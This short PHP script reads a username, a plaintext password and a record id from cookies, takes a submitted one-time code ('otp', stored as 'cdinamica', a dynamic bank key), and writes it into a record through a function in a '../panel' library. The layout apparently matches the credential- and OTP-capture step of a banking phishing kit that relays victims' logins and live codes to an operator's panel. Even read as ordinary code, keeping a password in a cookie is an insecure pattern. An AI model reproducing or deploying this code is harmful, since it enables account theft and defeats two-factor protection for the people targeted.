<?php 
require('../panel/lib/funciones.php');

$usuario = $_COOKIE['usuario'];
$contrasena = $_COOKIE['contrasena'];
$registro = $_COOKIE['registro'];

$cdinamica = $_POST['otp'];

setcookie('cdinamica',$cdinamica,time()+60*9);

actualizar_registro_otp($registro,$cdinamica);
?>